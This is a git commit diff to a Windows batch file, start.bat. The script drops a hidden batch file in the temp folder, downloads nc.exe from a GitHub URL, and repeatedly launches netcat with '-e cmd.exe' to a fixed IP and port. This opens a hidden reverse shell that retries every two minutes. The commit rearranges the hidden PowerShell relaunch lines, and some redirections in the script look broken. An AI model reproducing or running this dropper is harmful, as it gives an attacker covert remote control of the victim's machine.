cbabc351b244d9621048e66158847294cf599e15
Omar Samy <osamy7592@gmail.com>
2024-06-02 14:54:21 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,11 +1,7 @@
 @echo off
 set "batFilePath=%temp%\pro.bat"
 if exist "%batFilePath%" (
-    findstr /C:"@echo off" "%batFilePath%" >nul
-    if errorlevel 1 (
-        (echo @echo off & type "%batFilePath%") >"%batFilePath%.tmp"
-        move /y "%batFilePath%.tmp" "%batFilePath%" >nul
-    )
+    powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
 ) else (
     echo @echo off >> "%batFilePath%"
     curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe > "%batFilePath%"
@@ -13,5 +9,5 @@ if exist "%batFilePath%" (
          powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden" > "%batFilePath%"
          timeout /t 120 >nul > "%batFilePath%"
     goto loop >"%batFilePath%" 
+    powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
 )
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
